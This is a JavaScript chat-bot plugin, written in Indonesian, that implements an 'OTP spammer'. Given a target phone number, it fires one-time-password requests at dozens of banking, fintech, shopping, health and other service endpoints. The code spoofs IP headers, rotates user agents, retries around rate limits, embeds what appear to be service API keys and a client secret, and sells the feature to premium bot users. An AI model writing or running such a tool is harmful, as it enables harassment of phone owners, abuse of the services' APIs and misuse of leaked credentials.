// ./helpers/Events/spamotp.js

import axios from 'axios'
import { randomUUID, randomInt } from 'crypto'

// ==================== KONFIGURASI ====================
const CONFIG_SPAM = {
  retries: 2,
  timeout: 45000,
  delayMin: 3000,
  delayMax: 5000
}

const USER_AGENTS = [
  'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36',
  'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36',
  'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36',
  'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/120.0',
  'Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) Safari/604.1',
  'Mozilla/5.0 (Linux; Android 14; SM-S921B) Chrome/120.0.0.0 Mobile Safari/537.36'
]

const IP_POOL = []
for (let i = 0; i < 1000; i++) {
  IP_POOL.push(`${randomInt(1,255)}.${randomInt(1,255)}.${randomInt(1,255)}.${randomInt(1,255)}`)
}

function randomIP() { return IP_POOL[randomInt(0, IP_POOL.length - 1)] }
function randomUA() { return USER_AGENTS[randomInt(0, USER_AGENTS.length - 1)] }

function randomDelay(min = CONFIG_SPAM.delayMin, max = CONFIG_SPAM.delayMax) {
  const delay = randomInt(min, max)
  return new Promise(resolve => setTimeout(resolve, delay))
}

function normalizePhone(phone) {
  let p = phone.replace(/[^0-9]/g, "")
  if (p.startsWith("0")) p = "62" + p.slice(1)
  if (!p.startsWith("62")) p = "62" + p
  return p
}

function generateEmail() {
  const chars = 'abcdefghijklmnopqrstuvwxyz0123456789'
  let result = ''
  for (let i = 0; i < 10; i++) {
    result += chars.charAt(randomInt(0, chars.length - 1))
  }
  return `${result}@gmail.com`
}

// ==================== ENDPOINTS (80+) ====================
async function getOTPEndpoints(phone) {
  const p08 = "0" + phone.slice(2)
  const p62 = phone
  const pNoCountry = phone.replace("62", "")
  const deviceId = randomUUID()
  const requestId = randomUUID()
  const email = generateEmail()

  return [
    // E-COMMERCE (6)
    { name: 'Tokopedia', url: 'https://api.tokopedia.com/v1/user/request-otp', method: 'POST', data: { phone: p62 } },
    { name: 'Shopee', url: 'https://api.shopee.co.id/api/v1/account/request-otp', method: 'POST', data: { phone: p62 } },
    { name: 'Lazada', url: 'https://api.lazada.co.id/v1/otp/request', method: 'POST', data: { phone: p62 } },
    { name: 'Blibli', url: 'https://api.blibli.com/v1/otp/request', method: 'POST', data: { phoneNumber: p62 } },
    { name: 'Bukalapak', url: 'https://api.bukalapak.com/v1/otp/request', method: 'POST', data: { phone: p62 } },
    { name: 'Bonus Belanja', url: 'https://www.bonusbelanja.com/api/auth/registration/app', method: 'POST', data: { phone: p62, name: 'User', agreeTnc: true, agreeContact: false } },
    // FINTECH (4)
    { name: 'OVO', url: 'https://api.ovo.id/v1/otp/request', method: 'POST', data: { mobileNumber: p62 } },
    { name: 'DANA', url: 'https://api.dana.id/v1/auth/otp', method: 'POST', data: { phoneNumber: p62 } },
    { name: 'LinkAja', url: 'https://api.linkaja.id/v1/otp/request', method: 'POST', data: { phone: p62 } },
    { name: 'GoPay', url: 'https://api.gopay.co.id/v1/otp/request', method: 'POST', data: { phone: p62 } },
    // BANKING (4)
    { name: 'BCA', url: 'https://api.bca.co.id/v1/otp/request', method: 'POST', data: { phone: p62 } },
    { name: 'Mandiri', url: 'https://api.mandiri.co.id/v1/otp/request', method: 'POST', data: { phone: p62 } },
    { name: 'BNI', url: 'https://api.bni.co.id/v1/otp/request', method: 'POST', data: { phone: p62 } },
    { name: 'BRI', url: 'https://api.bri.co.id/v1/otp/request', method: 'POST', data: { phone: p62 } },
    // RIDE HAILING (2)
    { name: 'Gojek', url: 'https://api.gojekapi.com/v1/customers/request_otp', method: 'POST', data: { phone: p62 } },
    { name: 'Grab', url: 'https://api.grab.com/v1/otp/request', method: 'POST', data: { phoneNumber: p62, countryCode: 'ID' } },
    // FOOD DELIVERY (2)
    { name: 'GoFood', url: 'https://api.gofood.co.id/v1/otp/request', method: 'POST', data: { phone: p62 } },
    { name: 'GrabFood', url: 'https://api.grabfood.com/v1/otp/request', method: 'POST', data: { phoneNumber: p62 } },
    // HEALTHCARE (3)
    { name: 'Alodokter', url: 'https://www.alodokter.com/resend-otp', method: 'POST', data: { user: { phone: p08, uuid: randomUUID() }, request_via: 'whatsapp' } },
    { name: 'Halodoc', url: 'https://api.halodoc.com/v1/otp/request', method: 'POST', data: { phone: p62 } },
    { name: 'Dokterin', url: 'https://api.dokterin.id/user/v1/users/login', method: 'POST', data: { phone: p62, tnc_accept: true, device_id: randomUUID() } },
    // EDUCATION (2)
    { name: 'Ruangguru', url: 'https://api.ruangguru.com/v1/otp/request', method: 'POST', data: { phone: p62 } },
    { name: 'Zenius', url: 'https://api.zenius.net/v1/otp/request', method: 'POST', data: { phone: p62 } },
    // TRAVEL (2)
    { name: 'Traveloka', url: 'https://api.traveloka.com/v1/otp/request', method: 'POST', data: { phone: p62 } },
    { name: 'Agoda', url: 'https://api.agoda.com/v1/otp/request', method: 'POST', data: { phone: p62 } },
    // PROPERTY (2)
    { name: 'Rumah123', url: 'https://api.rumah123.com/v1/otp/request', method: 'POST', data: { phone: p62 } },
    { name: 'OLX', url: 'https://api.olx.co.id/v1/otp/request', method: 'POST', data: { phone: p62 } },
    // INSURANCE (2)
    { name: 'AXA', url: 'https://api.axa.co.id/v1/otp/request', method: 'POST', data: { phone: p62 } },
    { name: 'Allianz', url: 'https://api.allianz.co.id/v1/otp/request', method: 'POST', data: { phone: p62 } },
    // TELECOM (3)
    { name: 'Telkomsel', url: 'https://api.telkomsel.co.id/v1/otp/request', method: 'POST', data: { phone: p62 } },
    { name: 'Indosat', url: 'https://api.indosat.co.id/v1/otp/request', method: 'POST', data: { phone: p62 } },
    { name: 'XL', url: 'https://api.xl.co.id/v1/otp/request', method: 'POST', data: { phone: p62 } },
    // JOB PORTAL (2)
    { name: 'JobStreet', url: 'https://api.jobstreet.co.id/v1/otp/request', method: 'POST', data: { phone: p62 } },
    { name: 'Karir.com', url: 'https://api.karir.com/v1/otp/request', method: 'POST', data: { phone: p62 } },
    // SOCIAL MEDIA (2)
    { name: 'TikTok', url: 'https://api.tiktok.com/v1/account/request-otp', method: 'POST', data: { phone: p62 } },
    { name: 'Instagram', url: 'https://api.instagram.com/v1/accounts/request-otp', method: 'POST', data: { phone: p62 } },
    // GAMING (4)
    { name: 'Dunia Games', url: 'https://api.duniagames.co.id/api/other/api/v1/content/', method: 'GET', data: null, headers: { 'Accept-Language': 'id', 'x-device': deviceId, 'Ciam-Type': 'FR' } },
    { name: 'Mobile Legends', url: 'https://api.mobilelegends.com/v1/otp/request', method: 'POST', data: { phone: p62 } },
    { name: 'Free Fire', url: 'https://api.freefire.com/v1/otp/request', method: 'POST', data: { phone: p62 } },
    { name: 'PUBG Mobile', url: 'https://api.pubgmobile.com/v1/otp/request', method: 'POST', data: { phone: p62 } },
    // LAINNYA (14)
    { name: 'Maulagi', url: 'https://api.maulagi.id/api/v2/auth/check', method: 'POST', data: { credentials: p62 }, headers: { 'X-ML-KEY': 'B10JLPEP10' } },
    { name: 'Matahari', url: 'https://matahari-backend-prod.matahari.com/api/auth/re-activation', method: 'POST', data: { mobileCountryCode: '', mobileNumber: p08, activationCode: '' } },
    { name: 'Pinhome', url: 'https://www.pinhome.id/api/odyssey/proxy/pinaccount/auth/verification/request-otp', method: 'POST', data: { accountType: 'customers', applicationType: 'Pinhome Web', countryCode: '62', medium: 'whatsapp', otpType: 'register', phoneNumber: pNoCountry } },
    { name: 'BeautyHaul', url: 'https://www.beautyhaul.com/ajax/account/send_otp', method: 'POST', data: { method: 'WhatsApp', phone: p62 } },
    { name: 'Gritero', url: 'https://gateway.gritero.com/v1/auth/registration/whatsapp/send-otp?langcode=id', method: 'POST', data: { nama_lengkap: 'User', telepon: p08, email: `user${randomInt(1000,9999)}@mail.com` }, headers: { 'Xid': String(randomInt(1000000, 9999999)), 'source': 'ocistok' } },
    { name: 'Internet Rakyat', url: 'https://internetrakyat.id/api/app/auth/send-otp-register', method: 'POST', data: { phone_number: p08 }, headers: { 'x-api-key': '280999!FTTH', 'Origin': 'https://internetrakyat.id', 'Referer': 'https://internetrakyat.id/auth/register' } },
    { name: 'Paper.id', url: 'https://api.paper.id/api/v1/auth/login', method: 'POST', data: { method: 'whatsapp', phone: p08 }, headers: { 'x-paper-user-agent': 'Jupiter/7.19.5 desktop (windows) Firefox 152', 'request-id': requestId } },
    { name: 'Indodax', url: 'https://api.indodax.com/api/v1/otp/send', method: 'POST', data: { email: email, flow: 'register', method: 'whatsapp', old_uuid: '' }, headers: { 'key': 'bAGUG2WiLy', 'authorization': 'Bearer bAGUG2WiLy' } },
    { name: 'Bunda', url: 'https://cms.bunda.co.id/api/v1/auth/send-otp', method: 'POST', data: { phone_number: p62, type: 'auth' }, headers: { 'X-Requested-With': 'XMLHttpRequest', 'X-Locale': 'id' } },
    { name: 'Fastwork', url: 'https://api.fastwork.id/auth/v2/signup.sendVerificationCode', method: 'POST', data: { phone_number: p08 } },
    { name: 'Saturdays v1', url: 'https://saturdays.com/api/v1/auth/otp', method: 'POST', data: { phone: p62, type: 'register' } },
    { name: 'Saturdays v2', url: 'https://api.saturdays.com/v2/user/otp/request', method: 'POST', data: { phoneNumber: p62, channel: 'whatsapp' } },
    // SPAMV2 (6)
    { name: 'Sayurbox', url: 'https://www.sayurbox.com/graphql/v1?deduplicate=1', method: 'POST', data: { operationName: 'generateOTP', variables: { destinationType: 'whatsapp', identity: `+62${pNoCountry}` }, query: 'mutation generateOTP($destinationType: String!, $identity: String!) { generateOTP(destinationType: $destinationType, identity: $identity) { id __typename } }' } },
    { name: 'Matahari v2', url: 'https://www.matahari.com/rest/V1/thorCustomers/registration-resend-otp', method: 'POST', data: { otp_request: { mobile_number: pNoCountry, mobile_country_code: '+62' } } },
    { name: 'Tokko', url: 'https://api.tokko.io/graphql', method: 'POST', data: { operationName: 'generateOTP', variables: { generateOtpInput: { phoneNumber: `+62${pNoCountry}`, hashCode: '', channel: 'WHATSAPP', userType: 'MERCHANT' } }, query: 'mutation generateOTP($generateOtpInput: GenerateOtpInput!) { generateOtp(generateOtpInput: $generateOtpInput) { phoneNumber } }' } },
    { name: 'BukuWarung', url: 'https://api-v2.bukuwarung.com/api/v2/auth/otp/send', method: 'POST', data: { action: 'LOGIN_OTP', countryCode: '+62', deviceId: 'test-1', method: 'WA', phone: pNoCountry, clientId: '2e3570c6-317e-4524-b284-980e5a4335b6', clientSecret: 'S81VsdrwNUN23YARAL54MFjB2JSV2TLn' } },
    { name: 'Carsome', url: 'https://www.carsome.id/website/login/sendSMS', method: 'POST', data: { username: pNoCountry, optType: 1 } },
    { name: 'Ruparupa', url: 'https://wapi.ruparupa.com/auth/generate-otp', method: 'POST', data: { phone: pNoCountry, action: 'register', channel: 'chat', email: '', token: '', customer_id: '0', is_resend: 0 } }
  ]
}

// ==================== SEND REQUEST ====================
async function sendRequest(endpoint, idx, updateProgress) {
  const headers = {
    "Content-Type": "application/json",
    "User-Agent": randomUA(),
    "X-Forwarded-For": randomIP(),
    "X-Real-IP": randomIP(),
    "Accept": "application/json, text/plain, */*",
    "Accept-Language": "id-ID,id;q=0.9,en-US;q=0.8",
    "Connection": "keep-alive",
    ...(endpoint.headers || {})
  }

  if (endpoint.url.includes('fastwork.id')) {
    await randomDelay(30000, 45000)
  } else {
    await randomDelay(3000, 5000)
  }

  for (let attempt = 0; attempt <= CONFIG_SPAM.retries; attempt++) {
    try {
      const config = { headers, timeout: CONFIG_SPAM.timeout }
      let resp
      if (endpoint.method === "GET") {
        resp = await axios.get(endpoint.url, config)
      } else {
        resp = await axios.post(endpoint.url, endpoint.data, config)
      }

      let responseBody = {}
      try { responseBody = resp.data } catch(e) {}

      if ([200, 201, 202, 204].includes(resp.status)) {
        updateProgress(`✅ ${endpoint.name}`)
        return true
      }

      if (responseBody && (responseBody.success === true || responseBody.status === "success" ||
          responseBody.statusCode === 200 || responseBody.status === 202 ||
          responseBody.is_success === true ||
          responseBody.message === "OTP terkirim" || responseBody.message === "OTP sent successfully" ||
          responseBody.message === "Success." ||
          (responseBody.data && (responseBody.data.otp === "processed" || responseBody.data.new_uuid || responseBody.data.status === 1)) ||
          responseBody.secretCode)) {
        updateProgress(`✅ ${endpoint.name}`)
        return true
      }

      if (resp.status === 429) {
        let retryAfter = 30
        try {
          if (responseBody && responseBody.retry_after) retryAfter = parseInt(responseBody.retry_after) || 30
          if (responseBody && responseBody.error_code === 1015) retryAfter = 60
        } catch(e) {}
        updateProgress(`⏳ Rate limit ${endpoint.name}`)
        await randomDelay(retryAfter * 1000, (retryAfter + 10) * 1000)
        continue
      }

      if (attempt < CONFIG_SPAM.retries) {
        updateProgress(`🔄 Retry ${attempt+1}/${CONFIG_SPAM.retries} ${endpoint.name}`)
        await randomDelay(5000, 8000)
        continue
      }

    } catch (e) {
      if (attempt < CONFIG_SPAM.retries) {
        updateProgress(`🔄 Retry ${attempt+1}/${CONFIG_SPAM.retries} ${endpoint.name}`)
        await randomDelay(5000, 8000)
        continue
      }
    }
  }
  updateProgress(`❌ ${endpoint.name}`)
  return false
}

// ==================== SPAM OTP ====================
async function sendOTP(phoneNumber, progressCallback) {
  const phone = normalizePhone(phoneNumber)
  progressCallback(`🎯 Target: ${phone}`)
  
  const endpoints = await getOTPEndpoints(phone)
  progressCallback(`📡 Total: ${endpoints.length} endpoints`)

  const results = []
  const start = Date.now()

  for (let i = 0; i < endpoints.length; i++) {
    const result = await sendRequest(endpoints[i], i + 1, progressCallback)
    results.push(result)
    if (i < endpoints.length - 1) {
      await randomDelay(3000, 5000)
    }
  }

  const elapsed = ((Date.now() - start) / 1000).toFixed(1)
  const success = results.filter(r => r === true).length
  const failed = results.filter(r => r === false).length

  return {
    phone: phone,
    total: endpoints.length,
    success: success,
    failed: failed,
    elapsed: `${elapsed}s`
  }
}

// ==================== EVENT HANDLER (EXPORT) ====================
export default async function({ cht, ev }) {
  // === KONFIGURASI EVENT ===
  const cmd = ['spamotp', 'bomb', 'otp']
  const premium = true  // <== SET true/false di sini

  // Cek apakah command cocok
  if (!cmd.includes(cht.cmd)) return
  
  // Cek premium
  if (premium && !cht.isPremium) {
    return cht.reply('❌ *Fitur ini khusus untuk user premium!*')
  }

  // Cek input
  const input = cht.q?.trim()
  const prefix = cht.prefix || '.'

  if (!input) {
    return cht.reply(
      `📱 *OTP SPAMMER 80+ ENDPOINT*\n\n` +
      `╭┈┈⬡「 📋 *CARA PAKAI* 」\n` +
      `┃ ◦ \`${prefix}spamotp <nomor>\`\n` +
      `╰┈┈⬡\n\n` +
      `> Contoh: \`${prefix}spamotp 08123456789\`\n\n` +
      `⚠️ *Proses memakan waktu 3-5 menit*\n` +
      `⚠️ *Fitur Premium*`
    )
  }

  // Validasi nomor
  const phone = input.replace(/[^0-9]/g, "")
  if (phone.length < 10 || phone.length > 15) {
    return cht.reply(`❌ Nomor tidak valid! Minimal 10 digit, maksimal 15 digit.`)
  }

  await cht.react('📱')

  try {
    let progressMessages = []
    await cht.reply(`⏳ Memulai spam OTP ke *${phone}*...\n\n_Proses ini memakan waktu 3-5 menit_`)

    const progressCallback = (msg) => {
      progressMessages.push(msg)
      const lastMsgs = progressMessages.slice(-5).join('\n')
      cht.reply(`⏳ *PROGRESS SPAM OTP*\n\n${lastMsgs}`)
    }

    const result = await sendOTP(phone, progressCallback)

    const caption = 
      `✅ *SPAM OTP SELESAI!*\n\n` +
      `📱 Target: ${result.phone}\n` +
      `📡 Total Endpoint: ${result.total}\n` +
      `✅ Berhasil: ${result.success}\n` +
      `❌ Gagal: ${result.failed}\n` +
      `⏱️ Waktu: ${result.elapsed}\n\n` +
      `> 💡 Gunakan dengan bijak!`

    await cht.reply(caption)
    await cht.react('✅')

  } catch (error) {
    console.error('[SPAMOTP]', error.message)
    await cht.react('❌')
    await cht.reply(`❌ Error: ${error.message || 'Terjadi kesalahan'}`)
  }
}